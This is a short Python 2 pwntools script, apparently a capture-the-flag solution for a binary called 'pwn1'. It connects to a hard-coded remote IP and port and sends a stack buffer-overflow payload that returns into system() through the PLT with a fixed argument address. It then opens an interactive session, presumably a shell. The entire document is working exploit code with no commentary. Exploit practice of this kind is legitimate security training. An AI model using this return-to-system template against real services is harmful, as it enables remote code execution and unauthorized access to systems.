from pwn import *
# io=process('./pwn1')
io=remote('209.222.100.138',9878)
elf=ELF('./pwn1')
pay='a'*0x88+p32(0)+p32(elf.plt['system'])+p32(1)+p32(0x0804a024)



print io.recv()
io.sendline(pay)

io.interactive()